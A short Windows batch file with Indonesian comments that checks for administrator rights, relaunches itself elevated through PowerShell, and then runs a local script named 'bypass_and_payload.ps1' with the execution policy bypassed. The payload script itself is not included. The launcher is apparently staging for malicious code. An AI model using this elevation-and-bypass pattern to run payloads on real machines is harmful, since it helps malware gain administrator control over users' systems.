@echo off
:: ===================================
:: BATCH LAUNCHER WITH AUTO ELEVATION
:: ===================================

:: Cek apakah sudah administrator
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Membutuhkan hak administrator...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [*] Berjalan sebagai Administrator...

:: Jalankan PowerShell bypass dan payload
powershell -executionpolicy bypass -noprofile -file "%~dp0bypass_and_payload.ps1"

pause
exit
